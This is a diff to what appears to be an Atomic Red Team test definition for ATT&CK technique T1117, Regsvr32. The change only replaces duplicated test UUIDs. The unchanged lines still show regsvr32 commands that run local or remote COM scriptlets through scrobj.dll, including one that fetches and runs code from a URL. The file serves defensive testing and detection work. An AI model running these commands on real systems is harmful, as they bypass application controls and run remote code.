@@ -3,7 +3,7 @@ attack_technique: T1117
 display_name: Regsvr32
 atomic_tests:
 - name: Regsvr32 local COM scriptlet execution
-  uuid: d857f3bc-b3d1-446c-9f05-e052935314cf
+  uuid: d585c7fb-5dc7-483f-a02a-dffa7164b023
 
   description: |
     Regsvr32.exe is a command-line program used to register and unregister OLE controls
@@ -19,7 +19,7 @@ atomic_tests:
    command: |
     regsvr32.exe /s /u /i:#{filename} scrobj.dll
 - name: Regsvr32 remote COM scriptlet execution
-  uuid: d857f3bc-b3d1-446c-9f05-e052935314cf
+  uuid: 70b1a30d-a88e-42ea-8c9c-fafb3fa072f6
 
   description: |
     Regsvr32.exe is a command-line program used to register and unregister OLE controls
@@ -35,7 +35,7 @@ atomic_tests:
    command: |
     regsvr32.exe /s /u /i:#{url} scrobj.dll
 - name: Regsvr32 local DLL execution
-  uuid: d857f3bc-b3d1-446c-9f05-e052935314cf
+  uuid: abf81f9d-d169-4a98-ba62-647b7a23f648
 
   description: |
     Regsvr32.exe is a command-line program used to register and unregister OLE controls
